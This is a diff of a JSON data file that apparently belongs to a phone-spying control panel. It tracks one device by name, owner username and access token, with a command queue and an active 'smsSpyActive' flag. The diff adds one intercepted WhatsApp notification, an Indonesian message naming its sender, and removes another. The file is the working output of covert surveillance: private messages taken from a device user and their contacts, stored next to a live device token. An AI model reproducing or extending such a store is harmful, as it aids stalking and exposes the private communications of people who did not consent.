@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776857410793,
+    "lastSeen": 1776857419800,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "yaudah gausah kamu pake aja",
+        "time": "22/04 19:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776857420017
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841786519
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (20 pesan): ~ lizx7sex",
-        "content": ".hentai",
-        "time": "22/04 15:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841786409
       }
     ],
     "galleryPhotos": [],
